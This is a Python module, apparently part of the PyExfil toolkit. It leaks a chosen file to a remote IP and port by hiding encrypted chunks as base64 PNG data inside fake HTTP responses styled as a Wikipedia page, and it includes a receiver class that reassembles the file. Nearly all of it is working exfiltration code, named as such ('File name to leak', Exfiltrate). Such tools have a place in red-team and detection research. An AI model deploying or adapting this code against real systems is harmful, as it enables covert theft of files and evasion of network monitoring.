#!/usr/bin/env python

import sys
import time
import pytz
import socket
import datetime

from pyexfil.includes.prepare import PrepFile, DecodePacket, RebuildFile, DEFAULT_KEY

# Dev Zone
VEDGLAF = False

# Globals
DEFAULT_TIMEOUT = 5
HTTP_RESPONSE_HEADER = """HTTP/1.1 200 OK
Date: TIME
Server: Apache/2.2.14 (Win32)
Last-Modified: Thu, 20 Sep 2018 19:15:56 ICT
Content-Length: LEN
Content-Type: text/html
Connection: Closed
"""

BODY = """
<html>
	<head><title>Wikipedia | Aloha!</title></head>

	<body>
		<div>
		    <p>Taken from Wikpedia</p>
		    <img src="data:image/png;base64, B64" alt="Red dot COUNTER_LEN" />
		</div>
	</body>

</html>\r\n\r\n"""


class Assemble():
	def __init__(self, key=DEFAULT_KEY):
		self.counter = 0
		self.packets = []
		self.key = key

	def _append(self, data):
		if "/png;base64, " not in data:
			return False

		start = data.find("/png;base64, ") + len("/png;base64, ")
		end = data.find("\" alt=\"Red")

		if end is 0 or start is 0:
			return False

		self.packets.append(data[start:end])
		self.counter += 1
		print(self.counter)
		return True

	def Build(self):
		decodedPckts = []
		for pckt in self.packets:
			print(pckt)
			decodedPckt = DecodePacket(pckt, enc_key=self.key, b64_flag=True)
			if decodedPckt is not False:
				decodedPckts.append(decodedPckt)
			else:
				sys.stderr.write("Error decoding packet at index %s." % self.packets.index(pckt))
			continue
		print(RebuildFile(decodedPckts))


class Broadcast():

	def __init__(self, dst_ip, dst_port, fname, max_size=1024, key=DEFAULT_KEY):
		"""
		Broadcast data out.
		:param dst_ip: Outgoing server IP [str]
		:param dst_port: Port of server [int]
		:param fname: File name to leak [str]
		:param max_size: Maximum size of each packet [1024, int]
		:param key: Key to use for encryption [str]
		:return: None
		"""
		self.packets = []
		self.IP = dst_ip
		self.PORT = dst_port
		self.PF = PrepFile(file_path=fname, kind="ascii", max_size=max_size, enc_key=key)
		if self.PF is False:
			raise Exception("Cannot read file")
		self._buildPackets()


	def _buildPackets(self):
		total = len(self.PF['Packets'])
		for i in range(0, len(self.PF['Packets'])):
			h = HTTP_RESPONSE_HEADER.replace("TIME", (datetime.datetime.now().strftime("%a, %d %b %Y %H:%M:%S GMT")))
			b = BODY.replace("COUNT", str(i))
			b = b.replace("B64", self.PF['Packets'][i])
			b = b.replace("LEN", str(total))
			h = h.replace("COUNTER", str(i))
			h = h.replace("LEN", str(len(b)))
			self.packets.append(h+b)
		return True


	def _sendSinglePacket(self, index):
		s = socket.socket()
		s.settimeout(DEFAULT_TIMEOUT)
		try:
			s.connect((self.IP, self.PORT))
		except socket.error as e:
			sys.stderr.write(str(e))
			return False
		s.send(self.PF['Packets'][index])
		s.close()
		return True


	def Exfiltrate(self):
		check = 0
		for i in range(0, len(self.packets)):
			if VEDGLAF:
				f = True
			else:
				f = self._sendSinglePacket(i)
			if f is False:
				f = self._sendSinglePacket(i)
				if f is False:
					sys.stderr.write("Error sending packet index %s.\n" % i)
					continue
				check += 1
				continue
			else:
				check += 1
				continue
		if check == len(self.packets):
			sys.stdout.write("Finished sending %s packets.\n" % check)
		else:
			sys.stderr.write("Sent %s out of %s.\n" % (check, len(self.packets)))
